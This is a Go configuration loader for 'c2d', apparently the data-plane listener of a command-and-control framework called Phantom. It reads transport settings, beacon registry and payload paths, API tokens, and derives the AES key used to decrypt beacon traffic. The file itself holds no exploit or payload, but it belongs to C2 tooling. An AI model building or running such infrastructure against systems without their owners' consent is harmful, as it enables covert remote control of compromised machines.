// config.go — read the SAME operator state the Python control plane uses.
//
// c2d is a drop-in data plane: it must read the user's existing secrets and
// transport settings, not introduce a second source of truth. Everything
// comes from `data/config.json` (transport posture) and
// `data/phantom_state.json` (key material), with environment overrides that
// win, exactly like phantom.utils.config / phantom.utils.state.
package main

import (
	"crypto/sha256"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"strconv"
	"strings"
)

// Config is the resolved transport + key material for the listener.
type Config struct {
	Bind                  string
	Port                  int
	SSL                   bool
	MTLS                  bool
	MTLSRequireClientCert bool
	AllowPlaintext        bool

	CertsDir       string
	DataDir        string
	BeaconRegistry string
	PayloadDir     string

	AESKey       []byte
	APIToken     string
	PayloadToken string
}

func envOr(key, fallback string) string {
	if v := strings.TrimSpace(os.Getenv(key)); v != "" {
		return v
	}
	return fallback
}

// resolveDataDir mirrors phantom.utils.paths.data_dir: PHANTOM_DATA_DIR wins,
// else the repo-local `data/` next to the binary or the working directory.
func resolveDataDir() string {
	if v := strings.TrimSpace(os.Getenv("PHANTOM_DATA_DIR")); v != "" {
		return v
	}
	candidates := []string{}
	if exe, err := os.Executable(); err == nil {
		candidates = append(candidates,
			filepath.Join(filepath.Dir(exe), "data"),
			filepath.Join(filepath.Dir(exe), "..", "data"))
	}
	if wd, err := os.Getwd(); err == nil {
		candidates = append(candidates,
			filepath.Join(wd, "data"),
			filepath.Join(wd, "..", "data"))
	}
	for _, c := range candidates {
		if st, err := os.Stat(c); err == nil && st.IsDir() {
			return c
		}
	}
	return "data"
}

func readJSONMap(path string) map[string]any {
	raw, err := os.ReadFile(path)
	if err != nil {
		return map[string]any{}
	}
	var out map[string]any
	if err := json.Unmarshal(raw, &out); err != nil {
		return map[string]any{}
	}
	return out
}

func nestedString(m map[string]any, path string) string {
	cur := any(m)
	for _, part := range strings.Split(path, ".") {
		obj, ok := cur.(map[string]any)
		if !ok {
			return ""
		}
		cur, ok = obj[part]
		if !ok {
			return ""
		}
	}
	switch v := cur.(type) {
	case string:
		return v
	default:
		return fmt.Sprintf("%v", v)
	}
}

func nestedBool(m map[string]any, path string, fallback bool) bool {
	s := strings.ToLower(strings.TrimSpace(nestedString(m, path)))
	switch s {
	case "":
		return fallback
	case "1", "true", "yes", "on":
		return true
	default:
		return false
	}
}

func nestedInt(m map[string]any, path string, fallback int) int {
	s := strings.TrimSpace(nestedString(m, path))
	if s == "" {
		return fallback
	}
	if n, err := strconv.Atoi(s); err == nil {
		return n
	}
	return fallback
}

// deriveToLength is a port of phantom.utils.c2_crypto._derive_to_length, so
// the Go listener derives the SAME AES key from PHANTOM_C2_KEY that the
// Python server and the compiled beacon use. A drift here would silently make
// every beacon body undecryptable.
func deriveToLength(raw []byte, targetLen int) []byte {
	if len(raw) == targetLen {
		return raw
	}
	if len(raw) == targetLen*2 {
		if b, err := hex.DecodeString(string(raw)); err == nil {
			return b
		}
	}
	padded := string(raw) + strings.Repeat("=", (4-len(raw)%4)%4)
	if b, err := base64.StdEncoding.DecodeString(padded); err == nil && len(b) == targetLen {
		return b
	}
	sum := sha256.Sum256(raw)
	return sum[:targetLen]
}

// LoadConfig resolves the transport posture and key material.
func LoadConfig() (*Config, error) {
	dataDir := resolveDataDir()
	cfgMap := readJSONMap(filepath.Join(dataDir, "config.json"))
	stateMap := readJSONMap(envOr("PHANTOM_STATE_FILE",
		filepath.Join(dataDir, "phantom_state.json")))

	c := &Config{
		DataDir:  dataDir,
		Bind:     envOr("PHANTOM_C2_BIND", nestedString(cfgMap, "c2.bind")),
		Port:     nestedInt(cfgMap, "c2.port", 8080),
		SSL:      nestedBool(cfgMap, "c2.ssl", true),
		MTLS:     nestedBool(cfgMap, "c2.mtls", true),
		CertsDir: filepath.Join(dataDir, "certs"),
		BeaconRegistry: envOr("PHANTOM_BEACON_REGISTRY",
			filepath.Join(dataDir, "beacons", "beacon_registry.json")),
		PayloadDir: envOr("PHANTOM_PAYLOAD_DIR",
			filepath.Join(dataDir, "..", "phantom", "payloads", "beacon")),
	}
	if c.Bind == "" {
		c.Bind = "0.0.0.0"
	}
	c.MTLSRequireClientCert = nestedBool(cfgMap, "c2.mtls_require_client_cert", true)
	c.AllowPlaintext = nestedBool(cfgMap, "c2.allow_plaintext", false)

	if v := strings.TrimSpace(os.Getenv("PHANTOM_C2_PORT")); v != "" {
		if n, err := strconv.Atoi(v); err == nil {
			c.Port = n
		}
	}
	if v := strings.TrimSpace(os.Getenv("PHANTOM_C2_SSL")); v != "" {
		c.SSL = parseBoolDefault(v, true)
	}
	if v := strings.TrimSpace(os.Getenv("PHANTOM_MTLS_REQUIRE_CLIENT_CERT")); v != "" {
		c.MTLSRequireClientCert = parseBoolDefault(v, true)
	}
	if v := strings.TrimSpace(os.Getenv("PHANTOM_ALLOW_PLAINTEXT")); v != "" {
		c.AllowPlaintext = parseBoolDefault(v, false)
	}

	// Key material: env override, else persisted state. Same names as the
	// Python side so a single state file serves both.
	key := envOr("PHANTOM_C2_KEY", strAny(stateMap["PHANTOM_C2_KEY"]))
	if key == "" {
		return nil, fmt.Errorf("PHANTOM_C2_KEY missing: no beacons could be "+
			"decrypted (run the Python tool once to generate %s)",
			filepath.Join(dataDir, "phantom_state.json"))
	}
	c.AESKey = deriveToLength([]byte(key), 32)
	c.APIToken = envOr("PHANTOM_API_TOKEN", strAny(stateMap["PHANTOM_API_TOKEN"]))
	c.PayloadToken = envOr("PHANTOM_PAYLOAD_TOKEN", strAny(stateMap["PHANTOM_PAYLOAD_TOKEN"]))
	return c, nil
}

func strAny(v any) string {
	if v == nil {
		return ""
	}
	if s, ok := v.(string); ok {
		return s
	}
	return fmt.Sprintf("%v", v)
}

func parseBoolDefault(v string, fallback bool) bool {
	switch strings.ToLower(strings.TrimSpace(v)) {
	case "1", "true", "yes", "on":
		return true
	case "0", "false", "no", "off":
		return false
	}
	return fallback
}
